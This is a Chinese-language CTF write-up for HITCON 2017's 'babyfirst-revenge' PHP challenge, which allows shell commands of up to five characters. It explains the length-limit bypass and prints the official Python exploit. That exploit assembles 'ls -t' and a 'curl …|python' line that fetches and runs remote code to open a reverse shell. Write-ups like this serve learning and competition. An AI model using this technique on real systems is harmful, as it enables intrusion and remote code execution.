# babyfirst-revenge

> 分类：Web

## 题目描述

PHP 命令执行，`cmd` 长度限制 5 字符以内，每个用户有独立的沙箱目录。

## 考察知识点

- 短命令执行（长度限制绕过）
- 利用 `>` 创建文件、`\` 换行续写
- `ls -t` 按时间排序拼接命令

## 解法

源码：

```php
<?php
$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
    @exec($_GET['cmd']);
} else if (isset($_GET['reset'])) {
    @exec('/bin/rm -rf ' . $sandbox);
}
```

核心技巧：
1. `>文件名` 创建空文件（或用 `>\ 1\\` 等创建带特殊字符的文件名）
2. `\` 在 shell 中做换行续写
3. `ls -t` 按时间排序输出文件名，配合 `>` 重定向到文件，再用 `sh` 执行

先构造 `ls -t>g` 命令文件，再按时间顺序写入反弹 shell 命令（`curl xx|python`），最后 `sh` 执行。

官方 exp：

```python
import requests
from time import sleep
from urllib import quote

payload = [
    '>ls\\', 'ls>_', '>\ \\', '>-t\\', '>\>g', 'ls>>_',
    '>on', '>th\\', '>py\\', '>\|\\', '>pw\\', '>x.\\',
    '>xx\\', '>l.\\', '>el\\', '>sh\\', '>\ \\', '>rl\\', '>cu\\',
    'sh _', 'sh g',
]

r = requests.get('http://xxx/web1.php/?reset=1')
for i in payload:
    assert len(i) <= 5
    r = requests.get('http://xxx/web1.php/?cmd=' + quote(i))
    print(i)
    sleep(0.2)
```

## 参考答案

（flag 通过反弹 shell 后读取）

## 来源

- 作者：LoRexxar / Orange | https://lorexxar.cn/2017/11/10/hitcon2017-writeup/
- 官方 writeup：https://github.com/orangetw/My-CTF-Web-Challenges
